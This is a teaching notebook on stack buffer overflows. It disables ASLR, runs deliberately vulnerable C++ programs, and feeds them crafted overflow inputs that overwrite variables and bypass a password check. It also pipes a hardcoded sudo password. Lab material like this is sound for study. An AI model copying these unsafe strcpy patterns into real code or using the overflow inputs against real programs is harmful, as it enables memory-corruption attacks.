{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Buffer Overflows\n",
    "\n",
    "- most Internet worms use buffer overflow vulnerabilities to propagate\n",
    "- C and C++ assume that programmers are responsible for data integrity\n",
    "- modern compilers and OSes provide various protections making it harder to exploit traditional buffer overflows\n",
    "- once the buffer is allocated, there's no built-in mechanism to safeguard the amount of data that can be stored into to\n",
    "    - this is called buffer overrun or buffer overflow\n",
    "    - user data may overwrite other part of the memory it's not supposed to making the program behave differently or crashing the program\n",
    "    - hackers could take advantage of this flaw to control the program and may pawn the system by executing shellcode or payload of their choice\n",
    "- buffer overflow can violate all three core principles of **CIA** triad - **Confidentiality, Integrity, and Availability**\n",
    "- **Confidentiality**: allows attackers to read confidential or data that they're not supposed to have access to\n",
    "- **Integrity**: allows attackers to modify part of the data/program that they're not supposed to\n",
    "- **Availability**: allows attackes to crash the system (SEGFAULT) violating availbility of the service\n",
    "\n",
    "- typically two types:\n",
    "    1. stack overflow\n",
    "    2. heap overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disable ASLR and other compiler protections\n",
    "- compile.sh script disables compiler protections"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\r\n"
     ]
    }
   ],
   "source": [
    "# if value is 0; ASLR is disabled\n",
    "! cat /proc/sys/kernel/randomize_va_space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# run this on terminal\n",
    "# can't interactively type sudo password!\n",
    "! echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Program's memory and stack may shift\n",
    "- depending on how the program is launched, several factors make the program's location in memory shift\n",
    "    - even after virtual-address space randomization is disabled\n",
    "- e.g. environment variables, length of program name, argument length to program, etc.\n",
    "\n",
    "### see the difference between stack_overflow_demo.cpp and stack_overflow_demo1.cpp\n",
    "- stack_overflow_demo.cpp doesn't take any argument from commandline\n",
    "    - interactive program that prompts user to enter some text\n",
    "- stack_overflow_demo1.cpp takes\n",
    "    - uses argument provided to the program\n",
    "    - doesn't prompt user\n",
    "- let's compile and run these programs to see the address of buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cp ./booksrc/stack_overflow_demo.cpp .\n",
    "cp ./booksrc/stack_overflow_demo1.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 154,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[100];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    cout << \"Enter some text: \";\r\n",
      "    cin >> buffer;\r\n",
      "    cout << \"buffer contains: \\n\" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\" << endl;\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_demo.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void bad(char *data) {\r\n",
      "    char buffer[100];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    strcpy(buffer, data);\r\n",
      "    cout << \"buffer contains: \\n\" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    bad(argv[1]);\r\n",
      "    cout << \"Good bye!\" << endl;\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_demo1.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### buffer address in stack_overflow_demo.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile the program and run it\n",
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack_overflow_demo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "# since stack_overflow_demo.exe is an interactive program,\n",
    "# you must pipe some data into the program on Jupyter Notebook\n",
    "# On terminal, you can either pipe or interactively type when prompted\n",
    "! echo \"Hello_World\" | ./stack_overflow_demo.exe\n",
    "# Note the address of buffer!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*100)' | ./stack_overflow_demo.exe\n",
    "# Note the address of buffer!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "/bin/bash: line 1: 39852 Done                    python -c 'print(\"A\"*200)'\r\n",
      "     39853 Segmentation fault      | ./stack_overflow_demo.exe\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*200)' | ./stack_overflow_demo.exe\n",
    "# Note the address of buffer!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Notice the same address for buffer in stack_overflow_demo.exe no matter how long the user-entered text is\n",
    "\n",
    "## buffer address in stack_overflow_demo1.cpp\n",
    "- compile and run the program and notice the address of buffer at different location"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo1.cpp stack_overflow_demo1.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2bc\r\n",
      "buffer contains: \r\n",
      "Hello World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "# run the program with an argument\n",
    "# Note you CAN'T pipe the argument into the program as in previous example!\n",
    "! ./stack_overflow_demo1.exe \"Hello World\"\n",
    "# Note the address of buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2bc\r\n",
      "buffer contains: \r\n",
      "Hello World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./stack_overflow_demo1.exe \"Hello World\"\n",
    "# Note the address of buffer; no change because same program is run with the same length of argument"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc26c\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./stack_overflow_demo1.exe $(python -c 'print(\"A\"*100)')\n",
    "# Note the address of buffer!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc20c\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
     ]
    }
   ],
   "source": [
    "! ./stack_overflow_demo1.exe $(python -c 'print(\"A\"*200)')\n",
    "# Note the address of buffer!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## length of the program name\n",
    "- let's give names of different lengths to the same program and notice the address of buffer\n",
    "- this is true regardless whether the program takes an argument or not \n",
    "    - NOTE the name of the program itself is passed as an argument to the program as an environment variable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile the program and run stack_overflow_demo.cpp\n",
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack_overflow_demo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! echo \"Hello_World\" | ./stack_overflow_demo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "# if the same program is run multiple times, \n",
    "! echo \"Hello_World\" | ./stack_overflow_demo.exe\n",
    "# Notice no change in buffer address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile the program and run stack_overflow_demo.cpp\n",
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc30c\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! echo \"Hello_World\" | ./stack.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile the program and run stack_overflow_demo.cpp; output program name is stack1.exe\n",
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack1.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc30c\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! echo \"Hello_World\" | ./stack1.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 172,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile the program and run stack_overflow_demo.cpp; output program name is stack11.exe\n",
    "! echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack11.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc30c\r\n",
      "Enter some text: buffer contains: \r\n",
      "Hello_World\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! echo \"Hello_World\" | ./stack11.exe\n",
    "# perhaps, filename is not long engouh to make a difference"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2fc\n",
      "Enter some text: buffer contains: \n",
      "Hello_World\n",
      "Good bye!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's compile the program and run stack_overflow_demo.cpp; output program name is stack11111.exe\n",
    "echo kali | sudo -S ./compile.sh stack_overflow_demo.cpp stack11111.exe\n",
    "echo \"Hello_World\" | ./stack11111.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow\n",
    "- overrun in stack segment\n",
    "- let's use some programs to demonstrate various consequences of stackoverflow\n",
    "\n",
    "## Some consequences of stack overflow\n",
    "\n",
    "1. overwrite variable(s) with the data of your choice (Integrity)\n",
    "- change the flow of the program (Integrity)\n",
    "- remote code execution (Integrity, Confidentiality, Availability)\n",
    "\n",
    "### 1. overwrite variables with the data of your choice\n",
    "- demo program: booksrc/overflow_example.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's copy overflow_example.cpp to the current folder\n",
    "! cp booksrc/overflow_example.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tint num = 5;\r\n",
      "\tchar buffer_one[8], buffer_two[8];\r\n",
      "\r\n",
      "\tstrcpy(buffer_one, \"one\"); /* copy \"one\" into buffer_one */\r\n",
      "\tstrcpy(buffer_two, \"two\"); /* copy \"two\" into buffer_two */\r\n",
      "\t\r\n",
      "\tprintf(\"[BEFORE] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\r\n",
      "\tprintf(\"[BEFORE] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\r\n",
      "\tprintf(\"[BEFORE] num is at %p and is %d (0x%08x)\\n\", &num, num, num);\r\n",
      "\r\n",
      "\tprintf(\"\\n[STRCPY] copying %d bytes into buffer_two\\n\\n\",  strlen(argv[1]));\r\n",
      "\tstrcpy(buffer_two, argv[1]); /* copy first argument into buffer_two */\r\n",
      "\r\n",
      "\tprintf(\"[AFTER] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\r\n",
      "\tprintf(\"[AFTER] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\r\n",
      "\tprintf(\"[AFTER] num is at %p and is %d (0x%08x)\\n\", &num, num, num);\r\n",
      "    return 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "# let's looks at the content of overlfow_example.cpp\n",
    "! cat overflow_example.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of main to answer the following questions\n",
    "- what is the order of the variables pushed?\n",
    "- when argv[1] is copied to buffer_two, what may happen to other variables?\n",
    "- compile and run the program with some arguments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh booksrc/overflow_example.cpp overflow_example.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc33c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc344 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc34c and is 5 (0x00000005)\r\n"
     ]
    }
   ],
   "source": [
    "! ./overflow_example.exe\n",
    "# segfault is bad!! provide some argument"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 5 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'hello'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[AFTER] num is at 0xffffc33c and is 5 (0x00000005)\r\n"
     ]
    }
   ],
   "source": [
    "# run the program providing some argument\n",
    "! ./overflow_example.exe hello\n",
    "# notice the addresses of variables are shifted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 15 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'AAAAAAAAAAAAAAA'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'AAAAAAA'\r\n",
      "[AFTER] num is at 0xffffc33c and is 5 (0x00000005)\r\n"
     ]
    }
   ],
   "source": [
    "# try a few some other values like 15 As\n",
    "! ./overflow_example.exe $(python3 -c 'print(\"A\"*15, end=\"\")')\n",
    "# observe the values of buffer_two and buffer_one, and num"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 16 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'AAAAAAAAAAAAAAAA'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'AAAAAAAA'\r\n",
      "[AFTER] num is at 0xffffc33c and is 0 (0x00000000)\r\n"
     ]
    }
   ],
   "source": [
    "# try 16 As\n",
    "! ./overflow_example.exe $(python3 -c 'print(\"A\"*16, end=\"\")')\n",
    "# observe the values of buffer_two and buffer_one, and num\n",
    "# num is 0 which is ascii value of NULL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- try to overwrite int value variable with \"BCDE\"\n",
    "- how may bytes is value away from buffer_two?\n",
    "- find the difference between the address of value and buffer_two"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 20 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'AAAAAAAAAAAAAAAABCDE'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'AAAAAAAABCDE'\r\n",
      "[AFTER] num is at 0xffffc33c and is 1162101570 (0x45444342)\r\n"
     ]
    }
   ],
   "source": [
    "# try 16As and notice the int value variable\n",
    "! ./overflow_example.exe $(python3 -c 'print(\"A\"*16 + \"BCDE\", end=\"\")')\n",
    "# notice the value of num in hex printed 'EDCB', why?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-8\r\n"
     ]
    }
   ],
   "source": [
    "# subtract the address of buffer_two from the address of value\n",
    "# which variable is at higher location?\n",
    "! echo $((0xffffc32c - 0xffffc334))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 20 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'AAAAAAAAAAAAAAAABCDE'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'AAAAAAAABCDE'\r\n",
      "[AFTER] num is at 0xffffc33c and is 1162101570 (0x45444342)\r\n"
     ]
    }
   ],
   "source": [
    "# now try overwriting value with BCDE; in the right order\n",
    "! ./overflow_example.exe $(python3 -c 'print(\"A\"*16 + \"BCDE\", end=\"\")')\n",
    "# check if BCDE is in that order...\n",
    "# remember x86 is little-endian, i.e., smaller byte is stored first"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'B'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# check the hex values with python; also see the values of buffer_two and buffer_one\n",
    "chr(int('42', 16))\n",
    "# B is stored at the end!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x42'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# or find the hex representation of ASCII of B\n",
    "hex(ord('B'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[BEFORE] buffer_two is at 0xffffc32c and contains 'two'\r\n",
      "[BEFORE] buffer_one is at 0xffffc334 and contains 'one'\r\n",
      "[BEFORE] num is at 0xffffc33c and is 5 (0x00000005)\r\n",
      "\r\n",
      "[STRCPY] copying 20 bytes into buffer_two\r\n",
      "\r\n",
      "[AFTER] buffer_two is at 0xffffc32c and contains 'AAAAAAAAAAAAAAAAEDCB'\r\n",
      "[AFTER] buffer_one is at 0xffffc334 and contains 'AAAAAAAAEDCB'\r\n",
      "[AFTER] num is at 0xffffc33c and is 1111704645 (0x42434445)\r\n"
     ]
    }
   ],
   "source": [
    "# try one more time; using hex values of EDCB\n",
    "! ./overflow_example.exe $(python3 -c 'print(\"A\"*16 + \"\\x45\\x44\\x43\\x42\", end=\"\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. change the flow of the program\n",
    "- use ./booksrc/auth_overflow.cpp program as demo\n",
    "- authenticate without using actual password\n",
    "- let's see the contents of auth_overflow.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/auth_overflow.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int check_authentication(char *password) {\r\n",
      "\tint auth_flag = 0;\r\n",
      "\tchar password_buffer[16];\r\n",
      "\r\n",
      "\tstrcpy(password_buffer, password);\r\n",
      "\t\r\n",
      "\tif(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "\t\tauth_flag = 1;\r\n",
      "\tif(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "\t\tauth_flag = 1;\r\n",
      "\r\n",
      "\treturn auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tif(argc < 2) {\r\n",
      "\t\tcout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "\t\texit(0);\r\n",
      "\t}\r\n",
      "\tif(check_authentication(argv[1])) {\r\n",
      "\t\tcout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "\t\tcout << \"      Access Granted.\\n\";\r\n",
      "\t\tcout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "\t} else {\r\n",
      "\t\tcout << \"\\nAccess Denied.\\n\";\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./booksrc/auth_overflow.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile auth_overflow.cpp\n",
    "! echo kali | sudo -S ./compile.sh auth_overflow.cpp auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./auth_overflow.exe password\r\n"
     ]
    }
   ],
   "source": [
    "# run the program; gives help on how to run it properly\n",
    "! ./auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with password, outgrabe\n",
    "! ./auth_overflow.exe outgrabe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 180,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with password, brillig\n",
    "! ./auth_overflow.exe brillig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 181,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# anyother password shouldn't work!\n",
    "! ./auth_overflow.exe letmein"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### let's authenticate without real password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 182,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# since password_buffer is 16 bytes, let's provide 16 As as password\n",
    "! ./auth_overflow.exe $(python -c 'print(\"A\"*16, end=\"\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 183,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# how about 17 As\n",
    "! ./auth_overflow.exe $(python -c 'print(\"A\"*17, end=\"\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of check_authentication( ) to understand why 17As let's you in"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### examine stack using gdb-peda\n",
    "- run the program in GDB to see the address of auth_flag relative to that of password_buffer\n",
    "- peda will show address of both password_buffer and auth_flag in stack context\n",
    "\n",
    "```bash\n",
    "$ gdb -q auth_overflow.exe\n",
    "$ break check_authentication\n",
